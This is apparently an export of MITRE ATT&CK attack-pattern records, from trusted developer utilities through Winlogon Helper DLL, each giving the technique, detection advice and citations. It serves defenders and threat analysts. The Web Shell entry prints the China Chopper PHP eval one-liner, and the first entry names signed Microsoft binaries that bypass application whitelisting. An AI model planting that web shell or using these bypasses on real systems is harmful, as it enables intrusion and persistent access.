C# .csx script files can be written and executed with rcsi.exe at the command-line. An adversary can use rcsi.exe to proxy execution of arbitrary code to bypass application whitelisting policies that do not account for execution of rcsi.exe. (Citation: engima0x3 RCSI Bypass)

===WinDbg/CDB===

WinDbg is a Microsoft Windows kernel and user-mode debugging utility. The Microsoft Console Debugger (CDB) cdb.exe is also user-mode debugger. Both utilities are included in Windows software development kits and can be used as standalone tools. (Citation: Microsoft Debugging Tools for Windows) They are commonly used in software development and reverse engineering and may not be found on typical Windows systems. Both WinDbg.exe and cdb.exe binaries are signed by Microsoft.

An adversary can use WinDbg.exe and cdb.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for execution of those utilities. (Citation: Exploit Monday WinDbg)

It is likely possible to use other debuggers for similar purposes, such as the kernel-mode debugger kd.exe, which is also signed by Microsoft.

===Tracker===

The file tracker utility, tracker.exe, is included with the .NET framework as part of MSBuild. It is used for logging calls to the Windows file system. (Citation: Microsoft Docs File Tracking)

An adversary can use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions. (Citation: Twitter SubTee Tracker.exe)

Detection: The presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.

Use process monitoring to monitor the execution and arguments of MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, cdb.exe, and tracker.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.

Platforms: Windows

Data Sources: Process monitoring

Defense Bypassed: Application whitelisting

Permissions Required: User

System Requirements: MSBuild: .NET Framework version 4 or higher
DNX: .NET 4.5.2, Powershell 4.0
RCSI: .NET 4.5 or later, Visual Studio 2012

Remote Support: No

Contributors: Casey Smith, Matthew Demaske, Adaptforward","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1127', 'external_id': 'T1127'}, {'source_name': 'Exploit Monday WinDbg', 'description': 'Graeber, M. (2016, August 15). Bypassing Application Whitelisting by using WinDbg/CDB as a Shellcode Runner. Retrieved May 26, 2017.', 'url': 'http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html'}, {'source_name': 'MSDN MSBuild', 'description': 'Microsoft. (n.d.). MSBuild1. Retrieved November 30, 2016.', 'url': 'https://msdn.microsoft.com/library/dd393574.aspx'}, {'source_name': 'Microsoft Debugging Tools for Windows', 'description': 'Marshall, D. (2017, May 23). Debugging Tools for Windows (WinDbg, KD, CDB, NTSD). Retrieved June 29, 2017.', 'url': 'https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/index'}, {'source_name': 'Microsoft Docs File Tracking', 'description': 'B, M., Brown, K., Cai, S., Hogenson, G., Warren, G. (2016, November 4). File Tracking. Retrieved November 1, 2017.', 'url': 'https://docs.microsoft.com/visualstudio/msbuild/file-tracking'}, {'source_name': 'Microsoft Migrating from DNX', 'description': 'Knezevic, Z., Wenzel, M. Latham, L. (2016, June 20). Migrating from DNX to .NET Core CLI (project.json). Retrieved June 28, 2017.', 'url': 'https://docs.microsoft.com/en-us/dotnet/core/migration/from-dnx'}, {'source_name': 'Microsoft Roslyn CPT RCSI', 'description': 'Osenkov, K. (2011, October 19). Introducing the Microsoft “Roslyn” CTP. Retrieved June 28, 2017.', 'url': 'https://blogs.msdn.microsoft.com/visualstudio/2011/10/19/introducing-the-microsoft-roslyn-ctp/'}, {'source_name': 'SubTee GitHub All The Things Application Whitelisting Bypass', 'description': '[ Smith, C. (2016, August 17). Includes 5 Known Application Whitelisting/ Application Control Bypass Techniques in One File. Retrieved June 30, 2017.'}, {'source_name': 'Twitter SubTee Tracker.exe', 'description': 'Smith, C. (2016, October 31). SubTee Twitter Status. Retrieved November 1, 2017.', 'url': 'https://twitter.com/subTee/status/793151392185589760'}, {'source_name': 'engima0x3 DNX Bypass', 'description': 'Nelson, M. (2017, November 17). Bypassing Application Whitelisting By Using dnx.exe. Retrieved May 25, 2017.', 'url': 'https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/'}, {'source_name': 'engima0x3 RCSI Bypass', 'description': 'Nelson, M. (2016, November 21). Bypassing Application Whitelisting By Using rcsi.exe. Retrieved May 26, 2017.', 'url': 'https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process monitoring']","['User']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Casey Smith', 'Matthew Demaske, Adaptforward']","","['MSBuild: .NET Framework version 4 or higher\nDNX: .NET 4.5.2, Powershell 4.0\nRCSI: .NET 4.5 or later, Visual Studio 2012']","False","","['Application whitelisting']"
"attack-pattern","attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49","2017-05-31T21:31:23.195Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Two-Factor Authentication Interception","Use of two- or multifactor authentication is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. Adversaries may target authentication mechanisms, such as smart cards, to gain access to systems, services, and network resources.

If a smart card is used for two-factor authentication (2FA), then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)

Other methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors. (Citation: Operation Emmental)

Other hardware tokens, such as RSA SecurID, require the adversary to have access to the physical device or the seed and algorithm in addition to the corresponding credentials.

Detection: Detecting use of proxied smart card connections by an adversary may be difficult because it requires the token to be inserted into a system; thus it is more likely to be in use by a legitimate user and blend in with other network behavior.

Platforms: Linux, macOS, Windows

Permissions Required: Administrator, SYSTEM

System Requirements: Smart card Proxy: Use of smart cards for single or multifactor authentication to access to network resources. Attached smart card reader with card inserted.

Out-of-band one-time code: Access to the device, service, or communications to intercept the one-time code.

Hardware token: Access to the seed and algorithm of generating one-time codes.

Contributors: John Lambert, Microsoft Threat Intelligence Center","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1111', 'external_id': 'T1111'}, {'source_name': 'Mandiant M Trends 2011', 'description': 'Mandiant. (2011, January 27). Mandiant M-Trends 2011. Retrieved January 10, 2016.', 'url': 'https://dl.mandiant.com/EE/assets/PDF%20MTrends%202011.pdf'}, {'source_name': 'Operation Emmental', 'description': 'Sancho, D., Hacquebord, F., Link, R. (2014, July 22). Finding Holes Operation Emmental. Retrieved February 9, 2016.', 'url': 'http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-finding-holes-operation-emmental.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","","['Administrator', 'SYSTEM']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['John Lambert, Microsoft Threat Intelligence Center']","","['Smart card Proxy: Use of smart cards for single or multifactor authentication to access to network resources. Attached smart card reader with card inserted.\n\nOut-of-band one-time code: Access to the device, service, or communications to intercept the one-time code.\n\nHardware token: Access to the seed and algorithm of generating one-time codes.']","","",""
"attack-pattern","attack-pattern--c848fcf7-6b62-4bde-8216-b6c157d48da0","2017-05-31T21:30:53.408Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Uncommonly Used Port","Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.

Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Netflow/Enclave netflow, Process use of network, Process monitoring

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1065', 'external_id': 'T1065'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81","2017-05-31T21:31:00.645Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Valid Accounts","Adversaries may steal the credentials of a specific user or service account using Credential Access techniques. Compromised credentials may be used to bypass access controls placed on various resources on hosts and within the network and may even be used for persistent access to remote systems. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

Adversaries may also create accounts, sometimes using pre-defined account names and passwords, as a means for persistence through backup access in case other means are unsuccessful. 

The overlap of credentials and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)

Detection: Configure robust, consistent account activity audit policies across the enterprise. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).

Perform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.

Platforms: Linux, macOS, Windows

Data Sources: Authentication logs, Process monitoring

Effective Permissions: User, Administrator

Defense Bypassed: Anti-virus, Firewall, Host intrusion prevention systems, Network intrusion detection system, Process whitelisting, System access controls

Permissions Required: User, Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1078', 'external_id': 'T1078'}, {'source_name': 'TechNet Credential Theft', 'description': 'Microsoft. (2016, April 15). Attractive Accounts for Credential Theft. Retrieved June 3, 2016.', 'url': 'https://technet.microsoft.com/en-us/library/dn535501.aspx'}, {'source_name': 'TechNet Audit Policy', 'description': 'Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.', 'url': 'https://technet.microsoft.com/en-us/library/dn487457.aspx'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Authentication logs', 'Process monitoring']","['User', 'Administrator']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","['User', 'Administrator']","","","","['Anti-virus', 'Firewall', 'Host intrusion prevention systems', 'Network intrusion detection system', 'Process whitelisting', 'System access controls']"
"attack-pattern","attack-pattern--6faf650d-bf31-4eb4-802d-1000cf38efaf","2017-05-31T21:31:37.917Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Video Capture","An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.

Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen.

Detection: Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.

Behavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data.

Platforms: Windows

Data Sources: Process monitoring, File monitoring, API monitoring

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'collection'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1125', 'external_id': 'T1125'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process monitoring', 'File monitoring', 'API monitoring']","['User']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--830c9528-df21-472c-8c14-a036bf17d665","2017-05-31T21:31:13.915Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Web Service","Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.

Popular websites and social media can act as a mechanism for command and control and give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

Detection: Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Host network interface, Netflow/Enclave netflow, Network protocol analysis, Packet capture

Permissions Required: User

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1102', 'external_id': 'T1102'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']","['User']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--c16e5409-ee53-4d79-afdc-4099dc9292df","2017-05-31T21:31:13.061Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Web Shell","A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)

Web shells may serve as Redundant Access or as a persistence mechanism in case an adversary's primary access methods are detected and removed.

Detection: Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013)

`<?php @eval($_POST['password']);>`

Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running cmd or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)

Platforms: Linux, macOS, Windows

Data Sources: Anti-virus, File monitoring, Process monitoring, Authentication logs, Netflow/Enclave netflow

Effective Permissions: User, SYSTEM

System Requirements: Adversary access to Web server with vulnerability or account to upload and serve the Web shell file.","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1100', 'external_id': 'T1100'}, {'source_name': 'Lee 2013', 'description': 'Lee, T., Hanzlik, D., Ahl, I. (2013, August 7). Breaking Down the China Chopper Web Shell - Part I. Retrieved March 27, 2015.', 'url': 'https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html'}, {'source_name': 'US-CERT Alert TA15-314A Web Shells', 'description': 'US-CERT. (2015, November 13). Compromised Web Servers and Web Shells - Threat Awareness and Guidance. Retrieved June 8, 2016.', 'url': 'https://www.us-cert.gov/ncas/alerts/TA15-314A'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Anti-virus', 'File monitoring', 'Process monitoring', 'Authentication logs', 'Netflow/Enclave netflow']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","['User', 'SYSTEM']","['Adversary access to Web server with vulnerability or account to upload and serve the Web shell file.']","","",""
"attack-pattern","attack-pattern--ffe742ed-9100-4686-9e00-c331da544787","2017-05-31T21:31:00.200Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Windows Admin Shares","Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. 

Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over server message block (SMB) (Citation: Wikipedia SMB) to interact with systems using remote procedure calls (RPCs), (Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels. (Citation: Microsoft Admin Shares)

The Net utility can be used to connect to Windows admin shares on remote systems using `net use` commands with valid credentials. (Citation: Technet Net Use)

Detection: Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding. (Citation: Lateral Movement Payne) (Citation: Windows Event Forwarding Payne) Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as Net, on the command-line interface and Discovery techniques that could be used to find remotely accessible systems.

Platforms: Windows

Data Sources: Process use of network, Authentication logs, Process command-line parameters, Process monitoring

Permissions Required: Administrator

System Requirements: File and printer sharing over SMB enabled.
Host/network firewalls not blocking SMB ports between source and destination.
Use of domain account in administrator group on remote system or default system admin account.","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1077', 'external_id': 'T1077'}, {'source_name': 'Wikipedia SMB', 'description': 'Wikipedia. (2016, June 12). Server Message Block. Retrieved June 12, 2016.', 'url': 'https://en.wikipedia.org/wiki/Server%20Message%20Block'}, {'source_name': 'TechNet RPC', 'description': 'Microsoft. (2003, March 28). What Is RPC?. Retrieved June 12, 2016.', 'url': 'https://technet.microsoft.com/en-us/library/cc787851.aspx'}, {'source_name': 'Microsoft Admin Shares', 'description': 'Microsoft. (n.d.). How to create and delete hidden or administrative shares on client computers. Retrieved November 20, 2014.', 'url': 'http://support.microsoft.com/kb/314984'}, {'source_name': 'Technet Net Use', 'description': 'Microsoft. (n.d.). Net Use. Retrieved November 25, 2016.', 'url': 'https://technet.microsoft.com/bb490717.aspx'}, {'source_name': 'Lateral Movement Payne', 'description': 'Payne, J. (2015, November 26). Tracking Lateral Movement Part One - Special Groups and Specific Service Accounts. Retrieved February 1, 2016.', 'url': 'http://blogs.technet.com/b/jepayne/archive/2015/11/27/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts.aspx'}, {'source_name': 'Windows Event Forwarding Payne', 'description': 'Payne, J. (2015, November 23). Monitoring what matters - Windows Event Forwarding for everyone (even if you already have a SIEM.). Retrieved February 1, 2016.', 'url': 'http://blogs.technet.com/b/jepayne/archive/2015/11/24/monitoring-what-matters-windows-event-forwarding-for-everyone-even-if-you-already-have-a-siem.aspx'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']","['Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.']","","",""
"attack-pattern","attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055","2017-05-31T21:30:44.329Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Windows Management Instrumentation","Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)

An adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI 2015)

Detection: Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of ""wmic"" and detect commands that are used to perform remote behavior. (Citation: FireEye WMI 2015)

Platforms: Windows

Data Sources: Authentication logs, Netflow/Enclave netflow, Process command-line parameters, Process monitoring

Permissions Required: User, Administrator

System Requirements: WMI service, winmgmt, running.
Host/network firewalls allowing SMB and WMI ports from source to destination.
SMB authentication.

Remote Support: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1047', 'external_id': 'T1047'}, {'source_name': 'Wikipedia SMB', 'description': 'Wikipedia. (2016, June 12). Server Message Block. Retrieved June 12, 2016.', 'url': 'https://en.wikipedia.org/wiki/Server%20Message%20Block'}, {'source_name': 'TechNet RPC', 'description': 'Microsoft. (2003, March 28). What Is RPC?. Retrieved June 12, 2016.', 'url': 'https://technet.microsoft.com/en-us/library/cc787851.aspx'}, {'source_name': 'MSDN WMI', 'description': 'Microsoft. (n.d.). Windows Management Instrumentation. Retrieved April 27, 2016.', 'url': 'https://msdn.microsoft.com/en-us/library/aa394582.aspx'}, {'source_name': 'FireEye WMI 2015', 'description': 'Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.', 'url': 'https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Authentication logs', 'Netflow/Enclave netflow', 'Process command-line parameters', 'Process monitoring']","['User', 'Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['WMI service, winmgmt, running.\nHost/network firewalls allowing SMB and WMI ports from source to destination.\nSMB authentication.']","True","",""
"attack-pattern","attack-pattern--e906ae4d-1d3a-4675-be23-22f7311c0da4","2017-05-31T21:31:05.140Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Windows Management Instrumentation Event Subscription","Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may attempt to evade detection of this technique by compiling WMI scripts. (Citation: Dell WMI Persistence) Examples of events that may be subscribed to are the wall clock time or the computer's uptime. (Citation: Kazanciyan 2014) Several threat groups have reportedly used this technique to maintain persistence. (Citation: Mandiant M-Trends 2015)

Detection: Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence. (Citation: TechNet Autoruns)

Platforms: Windows

Data Sources: WMI Objects

Permissions Required: Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1084', 'external_id': 'T1084'}, {'source_name': 'Dell WMI Persistence', 'description': 'Dell SecureWorks Counter Threat Unit™ (CTU) Research Team. (2016, March 28). A Novel WMI Persistence Implementation. Retrieved March 30, 2016.', 'url': 'https://www.secureworks.com/blog/wmi-persistence'}, {'source_name': 'Kazanciyan 2014', 'description': 'Kazanciyan, R. & Hastings, M. (2014). Defcon 22 Presentation. Investigating PowerShell Attacks &#91;slides&#93;. Retrieved November 3, 2014.', 'url': 'https://www.defcon.org/images/defcon-22/dc-22-presentations/Kazanciyan-Hastings/DEFCON-22-Ryan-Kazanciyan-Matt-Hastings-Investigating-Powershell-Attacks.pdf'}, {'source_name': 'Mandiant M-Trends 2015', 'description': 'Mandiant. (2015, February 24). M-Trends 2015: A View from the Front Lines. Retrieved May 18, 2016.', 'url': 'https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf'}, {'source_name': 'TechNet Autoruns', 'description': 'Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.', 'url': 'https://technet.microsoft.com/en-us/sysinternals/bb963902'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['WMI Objects']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--c3bce4f4-9795-46c6-976e-8676300bbc39","2017-05-31T21:30:33.723Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Windows Remote Management","Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). (Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell. (Citation: Jacobsen 2014)

Detection: Monitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior. Monitor processes created and actions taken by the WinRM process or a WinRM invoked script to correlate it with other related events.

Platforms: Windows

Data Sources: File monitoring, Authentication logs, Netflow/Enclave netflow, Process command-line parameters, Process monitoring

Permissions Required: User, Administrator

System Requirements: WinRM listener turned on and configured on remote system

Remote Support: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1028', 'external_id': 'T1028'}, {'source_name': 'Microsoft WinRM', 'description': 'Microsoft. (n.d.). Windows Remote Management. Retrieved November 12, 2014.', 'url': 'http://msdn.microsoft.com/en-us/library/aa384426'}, {'source_name': 'Jacobsen 2014', 'description': 'Jacobsen, K. (2014, May 16). Lateral Movement with PowerShell&#91;slides&#93;. Retrieved November 12, 2014.', 'url': 'https://www.slideshare.net/kieranjacobsen/lateral-movement-with-power-shell-2'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Authentication logs', 'Netflow/Enclave netflow', 'Process command-line parameters', 'Process monitoring']","['User', 'Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['WinRM listener turned on and configured on remote system']","True","",""
"attack-pattern","attack-pattern--514ede4c-78b3-4d78-a38b-daddf6217a79","2017-05-31T21:30:20.148Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Winlogon Helper DLL","Winlogon is a part of some Windows versions that performs actions at logon. In Windows systems prior to Windows Vista, a Registry key can be modified that causes Winlogon to load a DLL on startup. Adversaries may take advantage of this feature to load adversarial code at startup for persistence.

Detection: Monitor for changes to registry entries in `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify` that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. (Citation: TechNet Autoruns)  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.

Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

Platforms: Windows

Data Sources: Windows Registry, File monitoring, Process monitoring

